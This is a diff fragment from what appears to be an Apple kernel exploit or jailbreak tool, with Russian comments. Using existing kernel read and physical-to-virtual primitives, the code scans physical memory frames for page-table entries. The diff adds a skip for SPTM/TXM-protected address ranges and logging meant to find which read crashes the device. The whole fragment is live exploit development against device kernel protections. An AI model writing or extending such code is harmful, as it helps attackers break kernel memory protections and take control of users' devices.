@@ -6979,7 +6979,13 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         uint64_t pa = kconstant(physBase) + (fb + e) * 0x4000;
                         uint64_t kva = gPrimitives.phystokv ? gPrimitives.phystokv(pa) : 0;
                         if (!kva) continue;
+                        if (kpVAIsEL2Domain(kva)) continue;   // 1.9.192: physmap-VA может численно попасть в SPTM/TXM-полосу — пропуск
                         nScanned++;
+                        // 1.9.192: предсмертная запись — лог ДО контент-чтения.
+                        // Тихий ресет 00:09 пришёлся на середину скана: последняя
+                        // строка назовёт тип убийцы (census-стратегия, поймавшая 0xb).
+                        kpNote(r, [NSString stringWithFormat:@"  [P3] читаю фрейм %#llx t=%#x kva=%#llx",
+                                  (unsigned long long)pa, t, (unsigned long long)kva]);
                         uint8_t pbuf[0x4000];
                         kreadbuf(kva, pbuf, sizeof(pbuf));   // рет НЕ проверяем — шим всегда 0 (урок SCAN A)
                         for (uint32_t o = 0; o + 8 <= sizeof(pbuf) && !pteVA; o += 8) {
